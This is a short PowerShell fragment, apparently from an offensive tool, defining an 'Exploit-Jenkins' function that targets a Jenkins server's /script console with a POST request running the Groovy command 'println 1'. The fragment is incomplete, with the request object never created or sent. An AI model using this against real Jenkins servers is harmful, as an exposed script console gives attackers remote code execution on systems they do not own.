function Exploit-Jenkins {
 $url = "http://"+$Rhost+":"+$Port+"/script"
 $webrequest.Method = "POST"
 $postdata="script=println+1&Submit=Run"
}
